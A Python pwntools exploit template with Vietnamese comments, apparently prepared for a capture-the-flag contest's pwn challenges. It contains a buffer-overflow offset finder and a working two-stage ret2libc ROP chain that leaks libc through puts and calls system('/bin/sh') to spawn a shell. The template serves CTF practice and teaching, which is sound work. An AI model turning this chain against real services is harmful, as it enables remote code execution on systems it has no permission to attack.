#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# =============================================================================
#  TEMPLATE PWNTOOLS CHUAN  -  Cyber SEA Game 2026 (Reverse / Pwn)
# -----------------------------------------------------------------------------
#  Muc dich: khung script khai thac binary (pwn) dung ngay trong giai.
#  Pwntools >= 4.15.0 (API on dinh). Kali co san; Windows thi:  pip install pwntools
#
#  CACH CHAY:
#    python3 tmpl_pwntools.py            # LOCAL  -> chay ./chall (process)
#    python3 tmpl_pwntools.py REMOTE     # REMOTE -> ket noi HOST:PORT
#    python3 tmpl_pwntools.py GDB        # LOCAL + tu dong attach GDB
#    python3 tmpl_pwntools.py DEBUG      # dat log_level = debug (in het goi/nhan)
#
#  LUU Y AN TOAN: KHONG chay binary la ma minh khong tin tuong. Day la KHUNG.
# =============================================================================

from pwn import *   # noqa: F401,F403  (nap toan bo tien ich: context, remote, p64, ...)
import sys

# =============================================================================
#  (1) CAU HINH  -  chinh o day
# =============================================================================
BINARY = "./chall"          # TODO: duong dan binary muc tieu
LIBC   = "./libc.so.6"      # TODO: duong dan libc dinh kem (de None neu khong co)
HOST   = "127.0.0.1"        # TODO: host cua server remote
PORT   = 1337               # TODO: port cua server remote

# Co dieu khien lay tu argv (xem phan CHAY o tren)
ARGS       = [a.upper() for a in sys.argv[1:]]
USE_REMOTE = "REMOTE" in ARGS
USE_GDB    = "GDB" in ARGS
DEBUG      = "DEBUG" in ARGS

# -----------------------------------------------------------------------------
#  context: kien truc / he dieu hanh / muc do log.
#  Cach TOT NHAT: tro context.binary vao ELF -> tu suy ra arch, bits, endian.
#  arch pho bien: 'amd64' (64-bit), 'i386' (32-bit). endian mac dinh 'little'.
# -----------------------------------------------------------------------------
context.clear()
context.terminal = ["wt.exe", "-w", "0", "nt", "wsl.exe"]  # TODO (tuy chon) lenh mo terminal moi cho GDB
# Kali thuong: context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug" if DEBUG else "info"
context.arch = "amd64"      # TODO: 'amd64' hoac 'i386' (se bi ghi de neu nap ELF ben duoi)

# Nap ELF cua chuong trinh (neu file ton tai) -> co elf.symbols, elf.got, elf.plt...
elf = None
try:
    elf = ELF(BINARY, checksec=False)
    context.binary = elf          # tu dong set arch/bits/endian theo binary
except Exception as e:
    log.warning("Chua nap duoc ELF '%s' (%s). Hay sua bien BINARY.", BINARY, e)

# Nap libc (de giai ASLR bang leak -> tinh base). De None neu chua co.
libc = None
if LIBC:
    try:
        libc = ELF(LIBC, checksec=False)
    except Exception as e:
        log.warning("Chua nap duoc LIBC '%s' (%s).", LIBC, e)


# =============================================================================
#  (2) TAO KET NOI  -  local process / remote / gdb
# =============================================================================
def start():
    """Tra ve tube (io) da ket noi theo che do dang chay."""
    if USE_REMOTE:
        log.info("REMOTE -> %s:%d", HOST, PORT)
        return remote(HOST, PORT)

    if USE_GDB:
        # Chay binary duoi GDB ngay tu dau (tu tat ASLR). Can terminal (xem context.terminal).
        log.info("LOCAL + GDB")
        return gdb.debug([BINARY], gdbscript=GDBSCRIPT)

    log.info("LOCAL -> %s", BINARY)
    return process([BINARY])        # them argv neu can, vd: process([BINARY, "arg1"])


# Script GDB chay khi attach/debug. Sua breakpoint theo bai.
GDBSCRIPT = """
# b *main                 # TODO: dat breakpoint, vd: b *0x401234  hoac  b *main+42
# b *vuln
continue
""".strip()


# =============================================================================
#  (3) HAM TIEN ICH  -  vit tat cho recv/send (goi cho ngan gon)
# =============================================================================
io = None  # se gan trong main()

def s(data):       return io.send(data)                 # gui
def sl(data):      return io.sendline(data)             # gui + newline
def sa(delim, d):  return io.sendafter(delim, d)        # cho delim roi gui
def sla(delim, d): return io.sendlineafter(delim, d)    # cho delim roi gui + newline
def r(n=4096):     return io.recv(n)                    # nhan toi da n byte
def rn(n):         return io.recvn(n)                    # nhan dung n byte
def rl():          return io.recvline()                 # nhan 1 dong
def ru(delim, drop=False): return io.recvuntil(delim, drop=drop)  # nhan den khi gap delim
def ia():          return io.interactive()              # chuyen sang tuong tac tay

# Goi y: cac delim/data nen la BYTES (b"..."), pwntools se tu encode str neu can.
# Vi du: sla(b"Name: ", b"admin")


# =============================================================================
#  (4) CYCLIC  -  tim offset tran bo dem (buffer overflow)
# -----------------------------------------------------------------------------
#  Buoc 1: gui cyclic(N) lam input, de chuong trinh crash.
#  Buoc 2: lay gia tri EIP/RIP (hoac noi dung RSP) tu GDB / core dump.
#  Buoc 3: cyclic_find(gia_tri) -> offset (so byte dem truoc khi ghi de return addr).
# =============================================================================
def find_offset_demo():
    """Vi du dung cyclic. Bo comment va chinh theo bai cu the."""
    payload = cyclic(200)                      # tao chuoi De Bruijn dai 200 byte
    # sla(b"input: ", payload)                 # TODO: gui payload roi de crash
    # ... sau khi crash, doc gia tri tran (vd tu gdb: $rsp hoac $eip) ...
    crashed_value = 0x6161616b             # TODO: thay bang gia tri thuc tu GDB
    # Voi 64-bit, gia tri thuong nam o thanh ghi / stack -> can p64 nguoc lai:
    #   offset = cyclic_find(p64(crashed_value))   # neu lay nguyen 8 byte
    offset = cyclic_find(crashed_value)
    log.success("Offset = %d", offset)
    return offset


# =============================================================================
#  (5) SKELETON ROP  -  xay chuoi ROP co ban
# -----------------------------------------------------------------------------
#  Y tuong chung (ret2libc 64-bit):
#    1) Leak dia chi mot ham libc (vd puts) qua puts(puts@got) -> tinh libc base.
#    2) Quay lai ham doc input lan 2.
#    3) Goi system("/bin/sh") hoac one_gadget.
#  Nho: 64-bit can gadget 'pop rdi; ret' de set doi so thu nhat.
# =============================================================================
def build_rop_leak():
    """Giai doan 1: ro ri dia chi libc. Yeu cau da nap elf."""
    assert elf is not None, "Can nap ELF truoc (sua bien BINARY)."
    rop = ROP(elf)

    POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]   # tu tim gadget
    RET     = rop.find_gadget(["ret"])[0]              # de can chinh stack 16-byte (movaps)

    offset = 40    # TODO: offset tim duoc tu cyclic (buoc 4)

    payload  = b"A" * offset
    payload += p64(RET)                       # can stack cho du 16 byte
    payload += p64(POP_RDI)
    payload += p64(elf.got["puts"])           # doi so: dia chi GOT cua puts
    payload += p64(elf.plt["puts"])           # goi puts -> in ra dia chi that cua puts
    payload += p64(elf.symbols["main"])       # quay ve main de nhap payload lan 2
    return payload

def build_rop_system(libc_base):
    """Giai doan 2: co libc_base roi -> goi system('/bin/sh')."""
    assert libc is not None, "Can nap LIBC (sua bien LIBC)."
    libc.address = libc_base                  # dat base -> moi symbol tu dong doi dung
    rop = ROP(elf)
    POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
    RET     = rop.find_gadget(["ret"])[0]

    binsh  = next(libc.search(b"/bin/sh\x00"))
    system = libc.symbols["system"]

    offset = 40    # TODO: cung offset nhu tren
    payload  = b"A" * offset
    payload += p64(RET)
    payload += p64(POP_RDI)
    payload += p64(binsh)
    payload += p64(system)
    return payload


# =============================================================================
#  (6) MAIN  -  luong khai thac
# =============================================================================
def main():
    global io
    io = start()

    # --------- VIET LOGIC KHAI THAC O DAY ---------
    # Vi du khung ret2libc 2 giai doan (bo comment va chinh offset/delim theo bai):
    #
    #   payload1 = build_rop_leak()
    #   sla(b"> ", payload1)                       # TODO: sua delim prompt
    #   leak = u64(rl().strip().ljust(8, b"\x00")) # doc dia chi puts bi leak
    #   log.success("puts leak = %#x", leak)
    #   libc_base = leak - libc.symbols["puts"]
    #   log.success("libc base = %#x", libc_base)
    #
    #   payload2 = build_rop_system(libc_base)
    #   sla(b"> ", payload2)                       # TODO: sua delim prompt
    #
    #   ia()   # lay shell -> go lenh: cat flag.txt

    # Mac dinh: ban giao cho nguoi dung tuong tac tay de thu tay truoc.
    io.interactive()


if __name__ == "__main__":
    main()
